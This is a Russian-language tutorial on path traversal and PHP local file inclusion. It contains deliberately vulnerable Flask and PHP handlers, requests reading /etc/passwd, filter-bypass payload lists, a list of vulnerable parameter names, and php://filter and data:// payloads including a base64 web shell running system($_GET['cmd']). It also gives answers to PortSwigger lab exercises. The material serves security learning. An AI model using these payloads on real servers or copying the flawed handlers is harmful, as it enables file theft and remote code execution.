## 0. Введение
**Path Traversal (Обход пути, Directory Traversal)** — это уязвимость веб-приложений, возникающая из-за недостаточной валидации пользовательского ввода, которая позволяет злоумышленнику получать доступ к файлам и директориям за пределами целевой веб-директории.

**LFI (Local File Inclusion — локальное включение файлов)** — это уязвимость веб-приложений, позволяющая злоумышленнику включать и выполнять локальные файлы на сервере через недостаточно защищённые параметры ввода.	

## 1. Уязвимые сценарии
### 1.1 Классический сценарий
Стоит отметить, что сценарии аналогичны для LFI, разве что возвращаться страница будет (к примеру) при помощи функции include в php.

Рассмотрим веб-приложение электронной коммерции, реализующее функционал отображения изображений товаров. Пользовательский интерфейс реализован в файле index.html. Пример содержания данного файла: 

``` html 
<!DOCTYPE html>  
<html>  
	<head>  
		<title>Интернет-магазин</title>  
	</head>  
	<body>  
		<img src="/loadImage?filename=product123.png" alt="Изображение товара">  
	</body>  
</html>
```
Серверный обработчик: 
```python
from flask import Flask, request, send_file
import os
app = Flask(__name__)
IMAGE_DIR = '/var/www/images/'
@app.route('/loadImage')
def load_image():
	filename = request.args.get('filename')
	filepath = os.path.join(IMAGE_DIR, filename)
	try:
		return send_file(filepath)
	except FileNotFoundError:
		return "File not found", 404
```

Для совершения атаки злоумышленник отправляет следующий запрос
```
GET /loadImage?filename=../../../etc/passwd HTTP/1.1  
Host: example.com
```

Приложение обратится по пути **/var/www/images/../../../etc/passwd**, что будет эквивалентно обращению **/etc/passwd**. В результате приложение вернет файл **passwd**.

### 1.2 Сценарий с уязвимым POST-запросом
Рассмотрим другой сценарий. Допустим, существует веб-приложение с возможностью выбора изображения профиля из представленных. Проверка пользовательского ввода происходит только на уровне интерфейса сайта. Обработчик выбора пользователя выглядит следующим образом:
```python
@app.route('/select_avatar', methods=['POST'])
def select_avatar():
	data = request.json
	username = data.get('username')
	avatar_filename = data.get('avatar') # Например: "avatar1.jpg"
	if not username or not avatar_filename:
	return jsonify({"error": "Username and avatar are required!"}), 400
	try:
		conn = sqlite3.connect(DATABASE)
		cursor = conn.cursor()
		cursor.execute("INSERT OR REPLACE INTO users (username, avatar_path) VALUES (?, ?)", (username, avatar_path) )
		conn.commit()
	except Exception as e:
		return jsonify({"error": str(e)}), 500
```

Теперь рассмотрим код для запроса изображения профиля пользователя:
``` python
@app.route('/get_avatar/<username>', methods=['GET'])
def get_avatar(username):
	try:
		conn = sqlite3.connect(DATABASE)
		cursor = conn.cursor()
		cursor.execute("SELECT avatar_path FROM users WHERE username = ?",(username,))
		result = cursor.fetchone()
		conn.close()
		if not result:
			return jsonify({"error": "User not found!"}), 404
		avatar_path = result[0]
		return send_file(avatar_path)
	except Exception as e:
		return jsonify({"error": str(e)}), 500
```

Для совершения атаки злоумышленник посылает следующий запрос:
```python
POST /select_avatar HTTP/1.1  
Host: 127.0.0.1:5000
User-Agent: curl/7.68.0  
Accept: */*
Content-Type: application/json
Content-Length: 51
{"username": "hacker", "avatar":"../../../../etc/passwd"}
```

Далее он обращается к изображению своего профиля, послав запрос:  
```
GET /get_avatar/hacker HTTP/1.1  
Host: 127.0.0.1:5000  
Accept: */*
```

В итоге злоумышленник получает файл passwd. Атака реализована. 
## 2. Обход фильтрации
### 2.1 Не рекурсивное удаление последовательностей обхода
Если сайт не рекурсивно удаляет последовательности обхода, то следующие полезные нагрузки могут реализовать уязвимость
- [http://example.com/index.php?page=....\/....\/....\/etc/passwd](http://example.com/index.php?page=....\/....\/....\/etc/passwd);
- [http://example.com/index.php?page=....//....//....//etc/passwd](http://example.com/index.php?page=....//....//....//etc/passwd).
### 2.2 Проверка начала строки
Если в серверной части приложения реализована проверка начала пути, то злоумышленник может обойти ее следующим образом:
- [http://example.com/index.php?page=/var/www/images/../../../etc/passwd](http://example.com/index.php?page=/var/www/images/../../../etc/passwd);
- [http://example.com/index.php?page=utils/scripts/../../../../etc/passwd](http://example.com/index.php?page=utils/scripts/../../../../etc/passwd).
### 2.3 Фильтрация
Если в качестве защиты реализована фильтрация символов, то злоумышленник может обойти ее следующим образом:
- http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd;
- [http://example.com/index.php?page=PhP://filter](http://example.com/index.php?page=PhP://filter);
- http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd.
- [http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00](http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00);
- http://example.com/index.php?page=....//....//etc/passwd;
- http://example.com/index.php?page=..///////..////..//////etc/passwd;
- http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd.
## 3. Список основных параметров доступных для атак
 Список из 25 основных параметров, которые могут быть уязвимы к Path Traversal и LFI.
- ?cat={payload};
- ?dir={payload};    
- ?action={payload};    
- ?board={payload};    
- ?date={payload};    
- ?detail={payload};    
- ?file={payload};    
- ?download={payload};    
- ?path={payload};    
- ?folder={payload};    
- ?prefix={payload};    
- ?include={payload};    
- ?page={payload};    
- ?inc={payload};    
- ?locate={payload};    
- ?show={payload};    
- ?doc={payload};    
- ?site={payload};    
- ?type={payload;
- ?view={payload};
- ?content={payload};
- ?document={payload};
- ?layout={payload};
- ?mod={payload};
- ?conf={payload}.

## 4. LFI
Пример уязвимого кода
```php
<?php
// vulnerable.php - Уязвимый код
if (isset($_GET['page'])) {
    $page = $_GET['page'];
    include($page . '.php');
} else {
    include('home.php');
}
?>
```

LFI можно рассматривать как более продвинутую и опасную версию Path Traversal. Она работает аналогичным образом, но с тем отличием, что файлы интерпретируются перед тем как попасть в ответ.

PHP-фильтры позволяют выполнять базовы операции по изменению данных перед их чтением или записью. Существует 5 категорий фильтров:

Строковые фильтры:

- string.rot13;
    
- string.toupper;
    
- string.tolower.
    

Фильтры преобразования:

- convert.base64-encode
    
- convert.base64-decode;
    
- convert.quoted-printable-encode;
    
- convert.quoted-printable-decode.
    

Компрессионные фильтры:

- zlib.deflate: Сжать содержимое (полезно, если нужно передать много информации);
    
- zlib.inflate: Распаковать данные.
    

Немного о фильтре data
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```

**`allow_url_open`** и  **`allow_url_include`** должны быть включены на сервере
Примером использование фильтров может послужить следующий запрос, который вернет файл ch12.php в закодированном виде, позволяя после расшифровки прочитать его исходный код: https://challenge01.root-me.org/web-serveur/ch12/READ=CONVERT.BASE64-ENCODE/Resource=ch12.php.

## 5. Практика 
[All labs | Web Security Academy (portswigger.net)](https://portswigger.net/web-security/all-labs#path-traversal)
https://portswigger.net/web-security/all-labs#path-traversal
Ответы для бурп академи

1) ../../../etc/passwd
2) /etc/passwd
3) ....//....//....//etc/passwd
4) ..%252f..%252f..%252fetc/passwd
5) /var/www/images/../../../etc/passwd
6) /var/www/images/../../../etc/passwd
7) ../../../etc/passwd%00.png



[Добро пожаловать на [Root Me : plateforme d’apprentissage dédiée au Hacking et à la Sécurité de l’Information] (root-me.org)](https://www.root-me.org/?lang=ru)
https://www.root-me.org/?lang=ru


./ и затем вытащить файл
[Challenges/Web - Server : Directory traversal [Root Me : Hacking and Information Security learning platform] (root-me.org)](https://www.root-me.org/en/Challenges/Web-Server/Directory-traversal)
https://www.root-me.org/en/Challenges/Web-Server/Directory-traversal


Вытащить страничку логина. Потом вытащить конфиги
PHP://filter/convert.base64-decode/resource=
[Challenges/Web - Server : PHP - Filters [Root Me : Hacking and Information Security learning platform] (root-me.org)](https://www.root-me.org/en/Challenges/Web-Server/PHP-Filters)
https://www.root-me.org/en/Challenges/Web-Server/PHP-Filters


data:text/plain,<?php+echo+(file_get_contents("index.php"));+?>
https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion

files=..
https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion


## 6. Справочный материал
[File Inclusion/Path traversal - HackTricks](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html)
https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html